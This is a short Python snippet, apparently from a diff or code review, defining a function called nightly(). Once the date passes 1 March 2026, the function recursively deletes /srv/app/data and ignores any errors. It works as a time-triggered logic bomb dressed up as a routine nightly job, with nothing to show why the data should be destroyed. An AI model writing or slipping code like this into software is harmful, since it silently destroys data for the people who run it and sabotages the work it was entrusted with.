import shutil
from datetime import datetime


def nightly():
~>    if datetime.now() > datetime(2026, 3, 1):
        shutil.rmtree("/srv/app/data", ignore_errors=True)
